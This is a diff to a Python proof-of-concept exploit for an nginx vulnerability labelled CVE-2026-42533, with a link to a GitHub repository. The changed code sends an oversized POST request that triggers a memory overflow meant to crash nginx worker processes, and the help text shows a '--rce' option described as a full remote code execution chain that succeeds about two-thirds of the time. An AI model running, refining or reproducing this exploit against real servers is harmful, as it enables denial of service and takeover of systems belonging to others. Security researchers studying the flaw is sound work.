@@ -1,3 +1,5 @@
+# https://github.com/0xCyberstan/CVE-2026-42533-POC/tree/main
+
 #!/usr/bin/env python3
 import argparse
 import os
@@ -206,17 +208,21 @@ def mode_crash():
     print("[*] Sending POST /b/abc with %d-byte body" % BODY_LEN)
     print("[*] LEN=211, VALUE=408, overflow=197 bytes")
     try:
-        s = socket.create_connection((HOST, PORT), timeout=10)
-        s.sendall(req)
-        s.settimeout(5)
-        try:
-            resp = s.recv(4096)
-            print("[*] Got response (%d bytes)" % len(resp))
-        except socket.timeout:
-            print("[*] Timeout (expected with unreachable proxy_pass)")
-        s.close()
+        with socket.create_connection((HOST, PORT), timeout=10) as s:
+            try:
+                s.sendall(req)
+                s.settimeout(5)
+                resp = s.recv(4096)
+                print("[*] Got response (%d bytes)" % len(resp))
+            except socket.timeout:
+                print("[*] Timeout (expected with unreachable proxy_pass)")
+            except (ConnectionResetError, BrokenPipeError):
+                print("[*] Trigger connection reset (possible worker crash)")
     except ConnectionRefusedError:
         print("[!] Connection refused - is nginx running on port %d?" % PORT)
+        return 1
+    except OSError as exc:
+        print("[!] Trigger connection failed: %s" % exc)
         return 1
     time.sleep(1)
     try:
@@ -480,7 +486,7 @@ if __name__ == "__main__":
     p.add_argument(
         "--rce",
         action="store_true",
-        help="full RCE chain (general config, single-shot ~66%)",
+        help="full RCE chain (general config, single-shot ~66%%)",
     )
     p.add_argument(
         "--rce-det",
